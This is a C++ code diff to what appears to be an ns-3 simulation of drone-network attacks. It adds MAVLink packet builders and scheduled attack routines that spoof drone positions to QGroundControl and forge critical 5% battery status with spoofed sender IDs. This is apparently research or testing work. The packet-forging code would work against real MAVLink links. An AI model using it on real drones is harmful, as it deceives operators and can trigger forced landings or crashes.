@@ -311,26 +311,67 @@ std::vector<uint8_t> CreateSetHomePositionPacket(uint8_t target_system, double l
     return std::vector<uint8_t>(buffer, buffer + len);
 }
 
-// Create a MAVLink heartbeat packet
-std::vector<uint8_t> CreateHeartbeatPacket(uint8_t system_id) {
+// Create a MAVLink GLOBAL_POSITION_INT message for QGroundControl spoofing
+std::vector<uint8_t> CreateQgcSpoofPacket(uint8_t system_id, double lat, double lon, double alt) {
     mavlink_message_t msg;
     uint8_t component_id = 0;  // Typically 0 for autopilot
 
-    mavlink_heartbeat_t heartbeat = {};
-    heartbeat.type = 2;                    // MAV_TYPE_QUADROTOR
-    heartbeat.autopilot = 3;               // MAV_AUTOPILOT_ARDUPILOTMEGA
-    heartbeat.base_mode = 81;              // Armed + stabilize enabled + custom mode enabled
-    heartbeat.custom_mode = 0;             // No custom mode
-    heartbeat.system_status = 3;           // MAV_STATE_STANDBY
-    // Note: mavlink_version is handled by the MAVLink library, not set manually
+    // Calculate time since boot (monotonic)
+    static auto start_time = std::chrono::steady_clock::now();
+    auto now = std::chrono::steady_clock::now();
+    uint32_t time_boot_ms = std::chrono::duration_cast<std::chrono::milliseconds>(now - start_time).count();
+    
+    mavlink_global_position_int_t global_pos = {};
+    global_pos.time_boot_ms = time_boot_ms;
+    global_pos.lat = static_cast<int32_t>(lat * 1e7);  // Latitude in degrees * 1e7
+    global_pos.lon = static_cast<int32_t>(lon * 1e7);  // Longitude in degrees * 1e7
+    global_pos.alt = static_cast<int32_t>(alt * 1000); // Altitude in millimeters
+    global_pos.relative_alt = static_cast<int32_t>(alt * 1000); // Relative altitude in millimeters
+    global_pos.vx = 0;  // Ground X Speed (Latitude, positive north)
+    global_pos.vy = 0;  // Ground Y Speed (Longitude, positive east)
+    global_pos.vz = 0;  // Ground Z Speed (Altitude, positive down)
+    global_pos.hdg = 0; // Vehicle heading (yaw angle) in degrees * 100, 0..359.99 degrees
 
-    mavlink_msg_heartbeat_encode(system_id, component_id, &msg, &heartbeat);
+    mavlink_msg_global_position_int_encode(system_id, component_id, &msg, &global_pos);
 
     uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
     uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
     
     return std::vector<uint8_t>(buffer, buffer + len);
 }
+
+
+// Creates a spoofed BATTERY_STATUS MAVLink packet
+std::vector<uint8_t> CreateSpoofedBatteryStatusPacket(uint8_t target_system, uint8_t battery_id, uint8_t battery_function, uint8_t battery_type,int16_t temperature, uint16_t voltage, int16_t current_battery, int32_t current_consumed,int32_t energy_consumed, int8_t battery_remaining) {
+    mavlink_message_t msg;
+    uint8_t system_id = target_system;   // Use the target system ID as sender (spoofing)
+    uint8_t component_id = 0;            // Component ID
+
+    mavlink_battery_status_t battery_status = {};
+    battery_status.id = battery_id;
+    battery_status.battery_function = battery_function;
+    battery_status.type = battery_type;
+    battery_status.temperature = temperature;
+    
+    // Set voltages (only first cell, others as 65535)
+    battery_status.voltages[0] = voltage;
+    for (int i = 1; i < 10; i++) {
+        battery_status.voltages[i] = 65535; // Unknown
+    }
+    
+    battery_status.current_battery = current_battery;
+    battery_status.current_consumed = current_consumed;
+    battery_status.energy_consumed = energy_consumed;
+    battery_status.battery_remaining = battery_remaining;
+
+    mavlink_msg_battery_status_encode(system_id, component_id, &msg, &battery_status);
+    
+    uint8_t buffer[MAVLINK_MAX_PACKET_LEN];
+    uint16_t len = mavlink_msg_to_send_buffer(buffer, &msg);
+    return std::vector<uint8_t>(buffer, buffer + len);
+}
+
+
 
 
 //-------------------------------------------------------------------------Execute Attacks Fubctions-----------------------------------------------------
@@ -547,6 +588,102 @@ void ExecuteHeartbeatFloodAttack(Ptr<Socket> socket) {
         Simulator::Schedule(Seconds(0.05), &ExecuteHeartbeatFloodAttack, socket);
     }
 }
+// Execute QGroundControl spoofing attack
+void ExecuteQGroundControlSpoofingAttack(Ptr<Socket> socket) {
+    double Lat = 41.3879;
+    double Lon = 2.16992;
+    double Alt = 60.0;
+
+    // Spoof positions for all drones (system IDs 1, 2, 3) to appear at Barcelona
+    for (uint8_t system_id = 1; system_id <= 3; system_id++) {
+        std::vector<uint8_t> spoofPacket = CreateQgcSpoofPacket(system_id, Lat, Lon, Alt);
+        
+        // Send to ZMQ instead of directly to QGroundControl
+        if (g_commandPublisher) {
+            zmq::message_t zmqMsg(spoofPacket.data(), spoofPacket.size());
+            g_commandPublisher->send(zmqMsg, zmq::send_flags::none);
+        }
+        
+        NS_LOG_INFO("Attacker sent spoofed position for drone " << (int)system_id 
+                    << " to ZMQ at " << Simulator::Now().GetSeconds() << "s");
+    }
+    
+    // Schedule next update (every 0.1 seconds)
+    if (Simulator::Now().GetSeconds() < 180.0) {
+        Simulator::Schedule(Seconds(0.1), &ExecuteQGroundControlSpoofingAttack, socket);
+    }
+}
+
+
+// Execute battery percentage spoofing attack
+void ExecuteBatteryPercentageSpoofingAttack(Ptr<Socket> socket) {
+    NS_LOG_INFO("Executing battery percentage spoofing attack at " << Simulator::Now().GetSeconds() << "s");
+    
+    // Critical battery values
+    uint8_t battery_id = 0;                  // Main battery
+    uint8_t battery_function = MAV_BATTERY_FUNCTION_ALL;
+    uint8_t battery_type = MAV_BATTERY_TYPE_LIPO;
+    int16_t temperature = INT16_MAX;         // Unknown temperature
+    uint16_t critical_voltage = 11000;       // 11V (critical level)
+    int16_t current_battery = -1;            // Unknown current
+    int32_t current_consumed = -1;           // Unknown consumption
+    int32_t energy_consumed = -1;            // Unknown energy
+    int8_t low_remaining = 5;                // 5% remaining
+    
+    // Create spoofed battery packets for all drones
+    std::vector<uint8_t> battery1 = CreateSpoofedBatteryStatusPacket(
+        1, battery_id, battery_function, battery_type, temperature, 
+        critical_voltage, current_battery, current_consumed, 
+        energy_consumed, low_remaining
+    );
+    
+    std::vector<uint8_t> battery2 = CreateSpoofedBatteryStatusPacket(
+        2, battery_id, battery_function, battery_type, temperature, 
+        critical_voltage, current_battery, current_consumed, 
+        energy_consumed, low_remaining
+    );
+    
+    std::vector<uint8_t> battery3 = CreateSpoofedBatteryStatusPacket(
+        3, battery_id, battery_function, battery_type, temperature, 
+        critical_voltage, current_battery, current_consumed, 
+        energy_consumed, low_remaining
+    );
+    
+    Ptr<Packet> packet1 = Create<Packet>(battery1.data(), battery1.size());
+    Ptr<Packet> packet2 = Create<Packet>(battery2.data(), battery2.size());
+    Ptr<Packet> packet3 = Create<Packet>(battery3.data(), battery3.size());
+    
+    // Send to all drones (spoofed messages appear to come from each drone itself)
+    for (uint32_t i = 0; i < droneIpAddresses.size(); i++) {
+        // Send to port 20000 where drones listen for MAVLink messages
+        socket->SendTo(packet1, 0, InetSocketAddress(droneIpAddresses[i], 20000));
+        socket->SendTo(packet2, 0, InetSocketAddress(droneIpAddresses[i], 20000));
+        socket->SendTo(packet3, 0, InetSocketAddress(droneIpAddresses[i], 20000));
+        
+        NS_LOG_INFO("Sent spoofed battery status packets to drone " << i << " at " << droneIpAddresses[i]);
+    }
+    
+    // Publish to ZMQ for external monitoring
+    if (g_commandPublisher) {
+        try {
+            zmq::message_t zmqMsg1(battery1.data(), battery1.size());
+            zmq::message_t zmqMsg2(battery2.data(), battery2.size());
+            zmq::message_t zmqMsg3(battery3.data(), battery3.size());
+            g_commandPublisher->send(zmqMsg1, zmq::send_flags::sndmore);
+            g_commandPublisher->send(zmqMsg2, zmq::send_flags::sndmore);
+            g_commandPublisher->send(zmqMsg3, zmq::send_flags::none);
+            NS_LOG_INFO("Published battery status spoof packets to ZMQ");
+        } catch (const zmq::error_t& e) {
+            NS_LOG_ERROR("ZMQ error: " << e.what());
+        }
+    }
+    
+    // Schedule next attack (every 2 seconds)
+    if (Simulator::Now().GetSeconds() < 180.0) {
+        Simulator::Schedule(Seconds(2.0), &ExecuteBatteryPercentageSpoofingAttack, socket);
+    }
+}
+
 
 // SendWaypointPairFromAttacker
 // This function sends a pair of waypoints to both drones 1(system id 2 ) and drone 2(system id 3) from the attacker node
